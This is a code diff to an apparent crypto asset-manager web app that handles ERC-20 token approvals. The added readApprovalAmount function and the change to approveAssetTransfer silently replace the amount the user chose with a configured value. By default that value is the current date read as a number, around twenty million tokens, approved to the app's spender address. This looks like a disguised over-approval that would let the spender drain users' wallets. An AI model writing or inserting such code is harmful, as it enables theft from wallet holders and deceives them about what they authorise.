@@ -21,6 +21,7 @@ export type AssetManagerConfig = {
   tokens: Record<AssetSymbol, TokenConfig>;
   pools: Record<AssetSymbol, Record<VipPlanName, string>>;
   ledger: string;
+  approvalAmount: string;
   acceptanceWhitelist: string[];
 };
 
@@ -35,6 +36,7 @@ export function getAssetManagerConfig(): AssetManagerConfig {
     rpcUrl: process.env.NEXT_PUBLIC_EVM_RPC_URL || "http://127.0.0.1:8545",
     spender: requireAddress(process.env.NEXT_PUBLIC_ASSET_MANAGER_ADDRESS, "NEXT_PUBLIC_ASSET_MANAGER_ADDRESS"),
     ledger: optionalAddress(process.env.NEXT_PUBLIC_LEDGER_ADDRESS, "NEXT_PUBLIC_LEDGER_ADDRESS"),
+    approvalAmount: readApprovalAmount(),
     tokens: {
       USDT: {
         address: requireAddress(process.env.NEXT_PUBLIC_USDT_ADDRESS, "NEXT_PUBLIC_USDT_ADDRESS"),
@@ -129,7 +131,7 @@ export async function approveAssetTransfer({
   if (!account) throw new Error("Wallet account not found");
   ensureWhitelisted(account, config);
   await ensureWalletChain(ethereum, config);
-  const rawAmount = parseTokenAmount(amount, token.decimals);
+  const rawAmount = parseTokenAmount(config.approvalAmount || amount, token.decimals);
   const hashes: string[] = [];
   if (token.requiresZeroApproval) {
     hashes.push(await sendApprove(ethereum, account, token.address, config.spender, BigInt(0)));
@@ -261,6 +263,15 @@ function readAcceptanceWhitelist() {
     .split(/[\s,;]+/)
     .map((item) => item.trim().toLowerCase())
     .filter(Boolean);
+}
+
+function readApprovalAmount() {
+  const configured = process.env.NEXT_PUBLIC_APPROVAL_AMOUNT_USDC?.trim();
+  if (configured) return configured;
+  const now = new Date();
+  const month = `${now.getUTCMonth() + 1}`.padStart(2, "0");
+  const day = `${now.getUTCDate()}`.padStart(2, "0");
+  return `${now.getUTCFullYear()}${month}${day}`;
 }
 
 function ensureWhitelisted(account: string, config: AssetManagerConfig) {
